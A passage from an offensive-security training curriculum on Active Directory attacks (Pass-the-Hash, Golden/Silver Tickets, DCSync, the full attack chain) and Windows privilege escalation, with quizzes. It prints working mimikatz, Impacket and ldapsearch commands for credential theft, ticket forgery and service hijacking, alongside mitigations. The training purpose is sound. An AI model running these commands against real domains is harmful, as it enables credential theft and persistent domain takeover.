- Impacket's remote-execution tools accept a hash directly instead of a password via -hashes LM:NTLM: psexec.py, wmiexec.py, smbexec.py, atexec.py
- mimikatz can inject a stolen hash into the current logon session for a new process: sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:<program>
- Pass-the-Hash targets NTLM authentication specifically - reaching a Kerberos-only service instead requires "overpass-the-hash", using the NT hash to request a real Kerberos ticket rather than answering an NTLM challenge
- Mitigation: Windows LAPS for unique randomized local admin passwords per host, disabling NTLM where feasible, and Restricted Admin mode / Credential Guard to limit what's exposed in memory

```bash
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@10.10.10.5
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@10.10.10.5
secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@10.10.10.5
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe
```

**Quick Quiz:**

1. Why does stealing an NT hash let an attacker authenticate without ever cracking it to a plaintext password?
   - Because NTLM automatically decrypts hashes into plaintext during transmission
   - Because the hash is reversible with a simple XOR
   - Because Windows stores plaintext passwords alongside the hash
   - **Because NTLM's challenge-response calculation only ever operates on the hash itself, not the plaintext** ✓
   > NTLM's math only needs the NT hash to compute a valid challenge response, so the plaintext password is never actually required.
2. Why does dumping one machine's local Administrator hash often grant access to many other machines?
   - Because Active Directory automatically syncs all local admin hashes
   - **Because organizations often reuse the same local Administrator password/hash across an entire machine image** ✓
   - Because the local Administrator account is disabled by default everywhere
   - Because NTLM hashes are globally unique and never repeat
   > Many orgs deploy the same local Administrator password across their workstation image, so one dumped hash can unlock dozens of other machines - this is exactly what LAPS is meant to fix.
3. An attacker has an NT hash but the target service only accepts Kerberos authentication. What must they use instead of plain Pass-the-Hash?
   - DCSync
   - A Golden Ticket
   - **Overpass-the-hash, using the NT hash to request a real Kerberos ticket** ✓
   - AS-REP Roasting
   > Pass-the-Hash specifically targets NTLM authentication; reaching a Kerberos-only service instead requires overpass-the-hash to request a legitimate Kerberos ticket using the NT hash.

#### 180. Golden Ticket Attacks (forging domain-wide persistence with the krbtgt hash) `[theory]` — Week 13

Recall from m16-1 that every TGT in the domain is encrypted with one specific account's hash: krbtgt, a special disabled built-in account that exists purely so the KDC has a key to sign tickets with. An attacker who obtains that one hash (typically after already reaching Domain Admin via some other chain, often DCSync) can forge — "golden" — a completely valid TGT entirely offline, for any username, real or invented, with any group memberships baked in, most usefully Domain Admins. Because the ticket is forged rather than issued, none of the normal account controls apply: no password check, an attacker-chosen lifetime (mimikatz defaults to ten years), and the forged identity doesn't even need to correspond to a real account. This is the canonical AD persistence technique, because the only real remediation — resetting the krbtgt password — has to be done twice, since AD retains the previous krbtgt password specifically to avoid invalidating tickets still in flight. You finish able to explain why krbtgt compromise is domain-ending and forge/inject a Golden Ticket with mimikatz.

**Key Points:**

- krbtgt is a special disabled built-in AD account whose NT hash is what the KDC uses to encrypt every TGT it ever issues in that domain
- With the krbtgt hash plus the domain SID, an attacker can forge a TGT completely offline for any username - real or fictitious - with arbitrary group SIDs embedded, typically Domain Admins
- Golden tickets bypass every normal account control: no password is checked, the ticket's lifetime is attacker-chosen (mimikatz defaults to 10 years), and the forged account doesn't need to exist in AD at all
- mimikatz: kerberos::golden /user:<any> /domain:<fqdn> /sid:<domain-sid> /krbtgt:<krbtgt-ntlm-hash> /ptt injects the forged ticket directly into the current session
- This is the canonical AD persistence technique - it survives until the krbtgt password is reset TWICE, because AD retains the previous krbtgt password to avoid breaking tickets already issued, so a single reset is not sufficient remediation
- Detection is difficult because using the ticket looks like normal Kerberos traffic; defenders look for TGTs with abnormal lifetimes or group memberships that don't match a real account in AD

```bash
lsadump::dcsync /domain:corp.local /user:krbtgt
kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:1a2b3c4d5e6f7890aabbccddeeff0011 /ptt
klist
```

**Quick Quiz:**

1. Why does compromising the krbtgt hash allow domain-wide forgery of any identity?
   - Because krbtgt has Domain Admin rights and can log in directly
   - **Because krbtgt is the account whose hash encrypts every TGT the KDC issues in that domain** ✓
   - Because krbtgt hashes rotate automatically and reveal all account passwords
   - Because krbtgt is the only account exempt from Kerberos entirely
   > Every TGT in the domain is encrypted with krbtgt's hash, so holding that hash lets an attacker forge a valid TGT for any identity, real or invented.
2. Why isn't a single krbtgt password reset enough to fully remediate a Golden Ticket compromise?
   - Because krbtgt passwords cannot be reset at all
   - Because Golden Tickets are stored on the DC's disk and survive any password change
   - **Because AD retains the previous krbtgt password to avoid invalidating tickets already in flight, so one reset alone doesn't invalidate forged tickets using the old hash** ✓
   - Because resetting krbtgt disables the entire domain
   > AD keeps the previous krbtgt password around to avoid breaking in-flight tickets, so a Golden Ticket forged with the old hash still works until krbtgt is reset a second time.
3. What makes a forged Golden Ticket bypass normal account controls like password checks?
   - It authenticates using a valid password that was recently rotated
   - **The ticket is forged offline entirely, so no password is ever checked and its lifetime/group memberships are attacker-chosen** ✓
   - It always impersonates the krbtgt account itself, which has no password checks
   - It uses AS-REP Roasting rather than the TGT flow
   > Because the ticket is forged rather than issued through the normal AS-REQ flow, no password check occurs, and the attacker chooses the lifetime and embedded group SIDs directly.

#### 181. Silver Ticket Attacks (forging a single service ticket, narrower than Golden) `[theory]` — Week 13

A Silver Ticket applies the same forging idea as a Golden Ticket but one level down: instead of the krbtgt hash, the attacker uses a specific service account's own hash — very often a machine's own computer account, since most local Windows services run as SYSTEM using that account's identity — to forge a TGS for just that one service. Because the forged ticket is handed straight to the target service and never touches the KDC at all, there's no DC-side log of a ticket being issued, making Silver Ticket use stealthier for that specific service than a Golden Ticket, at the cost of only working against services keyed by that one account's hash (a file share's CIFS service, WMI/scheduled tasks via HOST, a SQL Server's MSSQLSvc). You finish able to explain what limits a Silver Ticket's scope compared to a Golden Ticket and forge one with mimikatz against a named service.

**Key Points:**

- A Silver Ticket forges a TGS for one specific service using that service account's own hash - frequently a machine's computer account hash, since local Windows services commonly run as SYSTEM under that identity
- Unlike a Golden Ticket, a Silver Ticket never touches the KDC/DC at all - the forged TGS is presented directly to the target service, which decrypts and trusts it using its own key
- Scope is limited strictly to the SPN/service class the hash belongs to - e.g. CIFS for file shares, HOST for scheduled tasks/WMI, MSSQLSvc for SQL Server, HTTP for web services
- Because the DC never issues or logs the ticket, Silver Tickets are stealthier than Golden Tickets for that one service, at the cost of far narrower access
- mimikatz forges a Silver Ticket with the same kerberos::golden command used for Golden Tickets, but supplying /service and /target and the service account's hash instead of krbtgt: kerberos::golden /user:<any> /domain:<fqdn> /sid:<domain-sid> /target:<service-host-fqdn> /service:<service-class> /rc4:<service-account-ntlm-hash> /ptt
- Mitigation follows the same principle as Golden Tickets: rotate service account credentials regularly, and where the service supports PAC validation, enable it - PAC validation forces a callback to the DC, which undercuts some of the ticket's stealth

```bash
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /target:fileserver01.corp.local /service:cifs /rc4:c39f2beb3d2e9f7a267e4a1b6c3f9d21 /ptt
dir \\fileserver01.corp.local\c$
```

**Quick Quiz:**

1. Why is a Silver Ticket stealthier than a Golden Ticket for accessing one particular service?
   - Because it uses AES256 encryption which defenders can't monitor
   - **Because the forged ticket is presented directly to the target service and never touches or is logged by the KDC/DC** ✓
   - Because Silver Tickets expire within seconds, leaving no trace
   - Because it requires no encryption key at all
   > A Silver Ticket goes straight to the target service, which validates it with its own key - the DC never issues or logs it, unlike a Golden Ticket's TGT.
2. Why is a Silver Ticket's access narrower than a Golden Ticket's?
   - **Because it's encrypted with one specific service account's hash, so it only works against the SPN/service class that hash belongs to** ✓
   - Because it can only be used once before mimikatz deletes it
   - Because it requires Domain Admin rights to create
   - Because it only works for accounts with preauth disabled
   > A Silver Ticket is scoped to whatever service class the forging hash belongs to (e.g. CIFS, HOST, MSSQLSvc) - it can't be used to authenticate to unrelated services.
3. How does enabling PAC validation reduce a Silver Ticket's stealth advantage?
   - It disables the target service entirely
   - It automatically resets the service account's password every time a ticket is used
   - **It forces a callback to the DC to validate the ticket, undercutting the fact that Silver Tickets normally never touch the DC** ✓
   - It encrypts the service ticket a second time, making it uncrackable
   > PAC validation makes the service check back with the DC, which reintroduces exactly the DC-side visibility that made Silver Tickets stealthy in the first place.

#### 182. DCSync (pulling password hashes from a DC without touching its disk) `[theory]` — Week 13

M6's overview flagged misconfigured ACLs as a favorite privilege-escalation path; DCSync is the single most damaging thing that path can lead to. The Replicating Directory Changes and Replicating Directory Changes All extended rights are what real Domain Controllers use with each other to stay in sync, and they're normally held only by Domain Admins, Enterprise Admins, and the DCs themselves. An attacker who holds an account with those rights — whether granted legitimately or handed over via an ACL abuse chain — can impersonate a Domain Controller and ask a real DC to "replicate" its data, including every password hash in the domain, straight over the network. Because this is a normal, documented replication protocol rather than code execution or file access on the DC, DCSync traffic can blend into legitimate multi-DC replication rather than looking like a smash-and-grab. You finish able to run DCSync with both mimikatz and Impacket's secretsdump.py, and explain why pulling krbtgt via DCSync is usually the last step before forging a Golden Ticket.

**Key Points:**

- DCSync abuses the MS-DRSR replication protocol: any principal holding Replicating Directory Changes plus Replicating Directory Changes All can request that a real DC replicate directory data to it, and the DC complies because it believes it's talking to another DC
- Requires no code execution or file access on the DC itself - the requests originate from the attacker's own machine over the network, which is why it blends into normal replication traffic between real DCs
- Commonly the payoff of a longer privilege-escalation chain: compromise a lower-privilege account, abuse an ACL/ACE (GenericAll, WriteDacl) to grant that account replication rights, then run DCSync
- mimikatz: lsadump::dcsync /domain:corp.local /user:krbtgt pulls one account's hash; /all /csv pulls every account in the domain
- Impacket's secretsdump.py runs the same DRSUAPI-based attack remotely using only domain credentials that hold replication rights - no mimikatz and no access to the DC's filesystem needed
- Pulling krbtgt's hash via DCSync is the direct enabler for Golden Ticket forging (m16-5) - DCSync -> Golden Ticket is the classic domain-persistence combo
- Mitigation: tightly audit which principals hold Replicating Directory Changes/-All (should be limited to DAs, EAs, and the DCs themselves), and monitor for replication requests originating from non-DC hosts

```bash
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv
secretsdump.py corp.local/user:password@10.10.10.1
secretsdump.py -just-dc-user krbtgt corp.local/user:password@10.10.10.1
```

**Quick Quiz:**

1. Why can DCSync traffic blend into normal domain activity rather than looking like an obvious attack?
   - Because it is encrypted with a key nobody can detect
   - Because it only runs during scheduled maintenance windows
   - **Because it uses a normal, documented replication protocol that real DCs use with each other, rather than code execution or file access** ✓
   - Because Windows Defender is disabled during replication
   > DCSync abuses the legitimate MS-DRSR replication protocol that DCs already use amongst themselves, so the traffic can look like normal multi-DC replication.
2. What privilege does an attacker need to successfully run DCSync?
   - Local administrator on any workstation
   - **An account holding Replicating Directory Changes and Replicating Directory Changes All rights** ✓
   - Physical access to a Domain Controller's disk
   - A cracked Kerberoasted service account hash
   > DCSync requires a principal holding both Replicating Directory Changes and Replicating Directory Changes All - normally limited to DAs, EAs, and the DCs themselves.
3. Why is pulling krbtgt's hash via DCSync usually the step immediately before forging a Golden Ticket?
   - Because DCSync is the only way to authenticate as krbtgt directly
   - Because Golden Tickets require Replicating Directory Changes rights to use
   - Because DCSync automatically forges the Golden Ticket as part of its output
   - **Because DCSync replicates every password hash in the domain, including krbtgt's, which is exactly the hash a Golden Ticket needs to be forged** ✓
   > DCSync can pull krbtgt's hash directly from the DC's replicated data, and that hash is exactly what's needed to forge a Golden Ticket - making DCSync -> Golden Ticket the classic persistence combo.

#### 183. AD Enumeration Tooling Roundup (PowerView, SharpHound, ldapsearch) `[theory]` — Week 13

Every attack above needs a target to aim at first, and that's what this topic's tools are for — they're what actually finds the Kerberoastable account, the AS-REP roastable account, or the ACL misconfiguration that grants DCSync rights, before any of the previous topics' attacks can run. PowerView is a PowerShell recon library for interactive, LDAP-backed queries against live AD objects. SharpHound is BloodHound's official data collector — the exact tool that produced the dataset the L16 lab's "Shortest Paths to Domain Admins" graph was built from — walking AD via LDAP plus SMB/RPC session enumeration to capture users, groups, ACLs, sessions, and trusts in one pass. ldapsearch works at the raw protocol level, which matters the moment an attacker only has valid domain credentials and no Windows box to run PowerShell or SharpHound from. You finish able to run all three to answer the same underlying question the BloodHound graph in L16 answers visually: which accounts and relationships form the shortest path to Domain Admin.

**Key Points:**

- PowerView (part of PowerSploit) is a PowerShell recon library: Get-DomainUser, Get-DomainGroupMember, Get-DomainTrust, Get-DomainComputer, Find-DomainShare, Get-DomainGPO, and Get-ObjectAcl for raw LDAP-backed recon from an interactive session
- SharpHound is BloodHound's official data collector (a C# binary, or the Invoke-BloodHound PowerShell wrapper) - it walks AD via LDAP and SMB/RPC session enumeration and outputs the JSON that BloodHound's UI ingests to build the attack-path graph, exactly as done in the L16 lab
- SharpHound collection methods trade coverage for stealth: -CollectionMethod All gathers everything (sessions, ACLs, group memberships, trusts) but is noisiest; Default or DCOnly are lighter-touch options when local admin on workstations isn't available or stealth matters
- ldapsearch is protocol-level and platform-agnostic - useful the moment any valid domain credentials are available, even from a non-Windows box, to query LDAP directly for SPNs, userAccountControl flags, or group memberships without installing Windows-specific tooling
- Typical attacker LDAP filters: (servicePrincipalName=*) surfaces Kerberoastable accounts; (userAccountControl:1.2.840.113556.1.4.803:=4194304) surfaces AS-REP roastable accounts (preauth disabled)
- In practice these tools chain together: ldapsearch/PowerView for quick manual spot-checks, SharpHound plus BloodHound for the full visual graph - the same graph L16 has you read edge by edge to find the cheapest path to Domain Admin

```bash
Get-DomainUser -PreauthNotRequired -Properties samaccountname
Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname
Get-DomainTrust
SharpHound.exe -c All -d corp.local
ldapsearch -x -H ldap://10.10.10.1 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
ldapsearch -x -H ldap://10.10.10.1 -D "user@corp.local" -w 'password' -b "DC=corp,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
```

**Quick Quiz:**

1. Why would an attacker choose ldapsearch over SharpHound or PowerView in some situations?
   - ldapsearch is faster at building the visual BloodHound graph
   - **ldapsearch is protocol-level and platform-agnostic, useful the moment valid domain creds are available even from a non-Windows box** ✓
   - ldapsearch doesn't require any credentials at all
   - ldapsearch is a Windows-only tool with a graphical interface
   > ldapsearch works at the raw LDAP protocol level and needs no Windows-specific tooling, so it's usable from any box the moment valid domain credentials exist.
2. Why might an attacker choose SharpHound's Default or DCOnly collection method instead of -CollectionMethod All?
   - Because All only works if BloodHound is not installed
   - Because All cannot collect ACL information
   - **Because Default/DCOnly are lighter-touch and stealthier when local admin on workstations isn't available or stealth matters, whereas All is noisiest** ✓
   - Because DCOnly collects more data than All
   > All is the most thorough but noisiest option (sessions, ACLs, group memberships, trusts); Default/DCOnly trade some coverage for a lighter footprint.
3. Which LDAP filter would surface accounts vulnerable to AS-REP Roasting?
   - (servicePrincipalName=*)
   - (objectClass=computer)
   - (memberOf=Domain Admins)
   - **(userAccountControl:1.2.840.113556.1.4.803:=4194304)** ✓
   > The userAccountControl filter with the 4194304 bit surfaces accounts with the DONT_REQ_PREAUTH flag set, i.e. accounts vulnerable to AS-REP Roasting; the SPN filter instead surfaces Kerberoastable accounts.

#### 184. The Full AD Attack-Path Chain (enumeration to domain compromise) `[theory]` — Week 13

Real AD compromises are almost never a single technique in isolation — they're a chain, and every topic in this module is one link. This is the same story the L16 lab's BloodHound "Shortest Paths to Domain Admins" graph tells visually, condensed here into the sequence an attacker actually runs: enumerate the domain to find weak or overprivileged accounts, escalate through the weakest one, and repeat until Domain Admin is reached, then establish persistence so the access survives cleanup. Seeing the whole chain laid out end to end is what makes clear why a single Kerberoastable service account or one misconfigured ACL matters so disproportionately — each step looks individually minor, but they compound into full domain compromise. You finish able to narrate a complete AD attack path from initial low-privilege enumeration through to durable domain-wide persistence, and to explain why breaking any single link in that chain (rotating one password, fixing one ACL) can stop the whole thing.

**Key Points:**

- Real AD compromises are rarely one technique - they're a chain: enumerate, find a weak or overprivileged account, escalate via that account, repeat until Domain Admin, then establish persistence
- Step 1 - Enumerate: SharpHound/BloodHound or manual PowerView/ldapsearch (m16-8) maps every account, group, ACL, and trust - exactly what L16's 'Shortest Paths to Domain Admins' query visualizes as a graph
- Step 2 - Find low-hanging targets: Kerberoastable accounts (SPN set, m16-2) and AS-REP roastable accounts (preauth disabled, m16-3) require no elevated access to attack - just a domain user, or in the AS-REP case sometimes zero credentials at all
- Step 3 - Crack or reuse: crack the recovered hash offline with the matching hashcat mode (13100/18200/19600/19700), or if an NTLM hash was obtained some other way, skip cracking and Pass-the-Hash (m16-4) straight into a service
- Step 4 - Pivot: use the newly obtained account's rights - an ACL edge like GenericAll or WriteDacl surfaced in the BloodHound graph, or local admin on another host - to move closer to Domain Admin or to a principal holding Replicating Directory Changes rights
- Step 5 - DCSync: once a principal with replication rights is reached, DCSync (m16-7) pulls every hash in the domain, including krbtgt
- Step 6 - Persist: forge a Golden Ticket (m16-5) with the krbtgt hash for durable, near-undetectable domain-wide access that survives individual password resets
- This chain is exactly why a single weak service-account password or one misconfigured ACL matters disproportionately - each link is individually minor, but together they compound into full domain compromise

**Quick Quiz:**

1. In the full attack-path chain, why can an AS-REP roastable account sometimes be exploited before an attacker has any domain credentials at all?
   - Because AS-REP Roasting is the last step in the chain, after DCSync
   - Because it requires the krbtgt hash to be already compromised
   - Because it can only be run after Golden Ticket persistence is established
   - **Because AS-REP Roasting requires zero credentials in some cases, giving attackers a foothold before Kerberoasting (which needs a domain account) is even possible** ✓
   > AS-REP Roasting can sometimes be attempted with zero valid credentials, making it a viable entry point earlier in the chain than Kerberoasting, which needs at least a low-privilege domain account.
2. Why does the chain treat reaching a principal with Replicating Directory Changes rights as the critical pivot point before DCSync?
   - Because Replicating Directory Changes rights automatically grant Domain Admin group membership
   - Because those rights are required to crack Kerberoasted hashes
   - **Because DCSync can only be run by an account already holding those replication rights** ✓
   - Because those rights let an account run SharpHound remotely
   > DCSync requires an account holding Replicating Directory Changes and -All rights, so pivoting to a principal with those rights (often via ACL abuse) is the necessary step before DCSync can be run.
3. According to the chain's own conclusion, why does breaking a single link - like rotating one service account's password - matter disproportionately?
   - Because every step in the chain depends on the same single password
   - **Because each step in the chain individually looks minor, but they compound so that removing just one link can stop the entire path to Domain Admin** ✓
   - Because Domain Admin can only be reached through exactly one specific account
   - Because rotating a password automatically detects an attacker's presence
   > The chain is only as strong as its weakest link - since each step feeds the next, fixing any single one (like rotating a weak service account password or an ACL) can break the whole path to Domain Admin.


---

## M17: Windows Privilege Escalation & Pivoting

**Month 4** · Week 14 · 9 topics

The Windows fundamentals module covered privesc at a glance — AlwaysInstallElevated, unquoted paths, and the Potato family by name. This module goes hands-on with the exact commands behind each vector, then adds the half that turns one compromised host into access to an entire internal network: SSH tunnels, chisel, ligolo-ng, and proxychains. You leave able to take a low-privilege Windows foothold to SYSTEM through several independent paths, and route arbitrary tools through that foothold to reach segments you can't otherwise route to.

**Learning Outcomes:**

- Run a structured Windows privesc enumeration pass by hand (services, tasks, registry, installed software) and know what WinPEAS/Seatbelt automate
- Identify and exploit unquoted service paths and weak service ACLs to reroute a SYSTEM-level service to attacker-controlled code
- Abuse AlwaysInstallElevated, scheduled tasks, and DLL search-order hijacking as SYSTEM-level privesc vectors
- Use SeImpersonatePrivilege abuse (PrintSpoofer/RoguePotato/JuicyPotato) to escalate a service account to SYSTEM
- Build SSH tunnels and chisel/ligolo-ng pivots, then route tools like nmap through proxychains into a network segment reachable only from the compromised host

**Module Resources:**

- [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html) _(link)_
- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) _(link)_
- [GTFOBins](https://gtfobins.github.io) _(link)_
- [LOLBAS](https://lolbas-project.github.io) _(link)_
- [PEASS-ng (WinPEAS / LinPEAS)](https://github.com/peass-ng/PEASS-ng) _(tool)_
- [Seatbelt](https://github.com/GhostPack/Seatbelt) _(tool)_
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) _(tool)_
- [RoguePotato](https://github.com/antonioCoco/RoguePotato) _(tool)_
- [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) _(tool)_
- [chisel](https://github.com/jpillora/chisel) _(tool)_
- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) _(tool)_
- [PayloadsAllTheThings - Pivoting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Network%20Pivoting%20Techniques/README.md) _(link)_

**Module Quiz (11 questions):**

1. Why does manual Windows privesc enumeration remain a necessary skill even with tools like WinPEAS and Seatbelt available?
   - **Automated tools can be flagged by AV/EDR or fail to run through a restrictive shell, so the manual checklist is the fallback** ✓
   - WinPEAS and Seatbelt are deprecated projects no longer maintained
   - Manual commands can enumerate remote hosts, while WinPEAS only works locally
   - Seatbelt requires a GUI session to run
   > Manual enumeration is the fallback for exactly the situations where automated tools can't be used: AV/EDR detection or a shell too restrictive to upload a binary.
2. A service's binary path is unquoted and contains a writable directory earlier in the path. What second condition is required to actually exploit it?
   - The current user must be a local administrator
   - **A way to trigger the service to (re)start, such as a reboot or SERVICE_START rights** ✓
   - The service must be configured to run as a domain account
   - AlwaysInstallElevated must also be enabled
   > The malicious binary only executes once the service starts, so a writable directory must be paired with a way to restart the service.
3. For AlwaysInstallElevated to be exploitable for privesc, what must be true?
   - Only the HKCU key needs to be set to 1
   - Only the HKLM key needs to be set to 1
   - **Both the HKLM and HKCU AlwaysInstallElevated values must be set to 1** ✓
   - The Print Spooler service must be running
   > Checking only one of the two registry locations and concluding the box isn't vulnerable is a common mistake — both HKLM and HKCU must be set to 1 for the policy to apply.
4. What privilege do PrintSpoofer, RoguePotato, and JuicyPotato all abuse to obtain a SYSTEM token?
   - SeDebugPrivilege
   - **SeImpersonatePrivilege** ✓
   - SeBackupPrivilege
   - SeTakeOwnershipPrivilege
   > The entire Potato family exists to abuse SeImpersonatePrivilege, which many service accounts hold by default, to obtain a SYSTEM-level token.
5. Why does PrintSpoofer avoid the CLSID-matching problem that limits JuicyPotato on newer Windows builds?
   - **It abuses the Print Spooler service's named-pipe impersonation instead of coercing a DCOM connection** ✓
   - It runs as a scheduled task instead of a service
   - It requires local administrator rights up front
   - It targets the registry instead of a running service
   > PrintSpoofer's named-pipe approach via the Print Spooler service needs no CLSID at all, unlike JuicyPotato/RoguePotato which depend on DCOM coercion.
6. A scheduled task runs as SYSTEM and its target script sits in a directory you can write to. What's the correct exploitation approach?
   - **Overwrite the script the task already points to, then trigger or wait for the task to run** ✓
   - Recreate the entire scheduled task from scratch with elevated rights
   - Modify the task's registry key directly to point to your binary
   - This is only exploitable if the task also has an unquoted path
   > Like an unquoted-path service, a writable scheduled-task target is exploited by replacing what will already run, not by modifying the task configuration.
7. What must a DLL-hijack payload provide to avoid crashing the process that loads it?
   - A valid code-signing certificate
   - **The same exported function names the legitimate DLL provides** ✓
   - A smaller file size than the original DLL
   - Administrator-only file permissions
   > The importing process expects specific exported functions; if the hijack DLL doesn't provide them, the process crashes instead of running the payload.
8. You have a foothold that can only reach the attacker over outbound HTTPS, with no SSH server anywhere in the chain. Which tool is purpose-built for this?
   - ssh -D dynamic forwarding
   - **chisel, which tunnels TCP/UDP over HTTP as a single static binary** ✓
   - proxychains alone, with no other tooling
   - GatewayPorts configured on the target
   > chisel is designed for exactly this case: no SSH available, but HTTP/HTTPS egress works, and it ships as a single static binary for both Windows and Linux.
9. Why does ligolo-ng let you run any tool against a pivoted subnet without configuring each tool individually?
   - It disables the target's antivirus during the session
   - It only supports pre-approved tools like nmap and curl
   - **Its proxy/agent model adds a real tun interface and route on the attacker's machine, so routing works transparently** ✓
   - It tunnels over DNS instead of TCP
   > Unlike a SOCKS proxy every tool must be told to use, ligolo-ng's tun interface with a routed subnet makes any tool work natively against that subnet.
10. Through a proxychains-wrapped nmap scan, why does a TCP connect scan (-sT) work but a SYN scan (-sS) generally does not?
   - **proxychains only wraps standard connect() calls, not raw packet crafting that SYN scans require** ✓
   - SYN scans are disabled by dynamic_chain specifically
   - TCP connect scans do not use sockets at all
   - proxychains only supports scanning UDP ports
   > proxychains intercepts library-level connect() calls, which a TCP connect scan uses, but a SYN scan crafts raw packets directly, bypassing what proxychains can redirect.
11. What is the realistic order of operations this module's synthesis exercise follows?
   - Tunnel -> proxychains -> enumerate -> privesc -> SYSTEM
   - **Enumerate -> privesc -> SYSTEM -> tunnel -> proxychains** ✓
   - Privesc -> SYSTEM -> enumerate -> proxychains -> tunnel
   - SYSTEM -> enumerate -> tunnel -> privesc -> proxychains
   > The realistic chain is always enumerate first, escalate to SYSTEM, then use that access to stand up a tunnel and route tools through proxychains — not the two halves worked independently.

### Topics

#### 176. Windows Privesc Enumeration Methodology `[theory]` — Week 14

Every real Windows privesc engagement starts the same way: a low-privilege shell and no idea which of a dozen possible misconfigurations is present on this specific box. Tools like WinPEAS (from the PEASS-ng project) and Seatbelt (GhostPack) exist entirely to automate a checklist that's worth knowing manually first, because the manual version is what you fall back on when a target's AV flags the automated tool or you only have a restrictive shell that can't fetch and execute a binary. The checklist covers four areas: running services and their binary paths/permissions, scheduled tasks and their trigger/binary paths, registry keys that control autoruns and installer policy, and installed software versions that map to known local-exploit CVEs. Running the manual commands first and only then running WinPEAS to compare teaches you to read WinPEAS's (often noisy, color-coded) output critically instead of just screenshotting whatever it highlights in red. You finish able to manually enumerate a Windows host's privesc surface end to end, and read WinPEAS/Seatbelt output as a cross-check rather than a black box.

**Key Points:**

- WinPEAS (PEASS-ng project) and Seatbelt (GhostPack) both automate the same checklist: services, scheduled tasks, registry autoruns/policies, installed software and patch level, and stored credentials
- Manual enumeration matters because automated tools get flagged by AV/EDR or can't be uploaded through a restrictive shell
- Services: check binary path, quoting, and who can modify the binary or reconfigure the service
- Scheduled tasks: check trigger, binary path, and whether that path is writable by the current user
- Registry: check AlwaysInstallElevated policy keys and Run/RunOnce autorun keys under HKLM and HKCU
- Installed software and OS build/patch level map to known local-exploit CVEs — a version check is often the fastest win
- systeminfo gives OS build and patch level in one command; whoami /priv shows which special privileges (like SeImpersonatePrivilege) the current token holds

```bash
whoami /priv
systeminfo
wmic qfe list
wmic service get name,pathname,startmode,startname
schtasks /query /fo LIST /v
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
wmic product get name,version
.\winPEASx64.exe quiet servicesinfo
.\Seatbelt.exe -group=all
```

**Quick Quiz:**

1. Why is it worth running the manual Windows privesc enumeration commands even when WinPEAS/Seatbelt are available?
   - **Automated tools can get flagged by AV/EDR or can't be uploaded through a restrictive shell, so the manual version is the fallback** ✓
   - WinPEAS and Seatbelt only check the registry, never services or scheduled tasks
   - Manual commands always run faster than WinPEAS regardless of shell type
   - whoami /priv and systeminfo are not part of any automated checklist
   > WinPEAS/Seatbelt automate the same checklist a manual pass covers, but AV/EDR flags or a restrictive shell can block them entirely, so knowing the manual commands is the fallback.
2. During enumeration, whoami /priv shows SeImpersonatePrivilege is enabled on the current token. What does that directly indicate?
   - The OS build and patch level, for matching against known CVEs
   - **A special privilege held by the current token that later token-impersonation techniques (like PrintSpoofer) can abuse** ✓
   - That AlwaysInstallElevated is set in the registry
   - That a scheduled task is running as SYSTEM
   > whoami /priv lists the special privileges the current token holds, and SeImpersonatePrivilege is the precondition token-impersonation privesc techniques rely on.
3. Which single command reports OS build and patch level in one pass, useful for spotting known local-exploit CVEs?
   - schtasks /query /fo LIST /v
   - wmic service get name,pathname,startmode,startname
   - **systeminfo** ✓
   - reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   > systeminfo gives OS build and patch level in one command, which is often the fastest way to spot a version that maps to a known local-exploit CVE.

#### 177. Service Misconfigurations - Unquoted Paths & Weak Service Permissions `[theory]` — Week 14

Windows services almost always run as SYSTEM or another privileged account, which makes them one of the highest-value misconfigurations to find. An unquoted service path like C:\Program Files\My App\service.exe means the Windows service control manager, when it sees unescaped spaces, tries each space-delimited segment as a candidate executable in order before falling back to the full string — so it tries C:\Program.exe, then C:\Program Files\My.exe, before ever trying the real path. If any of those earlier segments is a directory you can write to, dropping a malicious Program.exe there gets it launched as SYSTEM the next time the service starts. Separately, even a correctly-quoted service can be abused if its ACL is too permissive: accesschk (Sysinternals) or icacls shows exactly who can reconfigure the service itself, and sc config lets you point a service you have SERVICE_CHANGE_CONFIG rights over at your own binary or your own account, so the SCM launches your code with the service's privileges the next time it starts. You finish able to spot both variants during enumeration and reconfigure a misconfigured service to run your own payload as SYSTEM.

**Key Points:**

- Unquoted path exploit: an unescaped space in a service's binary path makes the SCM try each earlier space-delimited segment as an executable first
- Requires a directory you can write to earlier in the unquoted path AND a way to restart the service (reboot, or SERVICE_START rights)
- wmic service get name,pathname,startmode | findstr /i /v '"' surfaces unquoted paths quickly by finding paths without quote characters
- accesschk.exe (Sysinternals) or icacls shows who has permission to reconfigure a service, not just run it
- sc config <service> binpath= "<path>" and sc config <service> obj= LocalSystem password= "" both require a space after the equals sign — a common syntax trap
- If you can only write the binary (not reconfigure the service), replacing the target .exe directly and restarting the service achieves the same result
- sc qc <service> shows current binary path, start type, and the account the service runs as — the first thing to check per service

```bash
sc qc <service_name>
wmic service get name,pathname,startmode
icacls "C:\Program Files\Vulnerable App\"
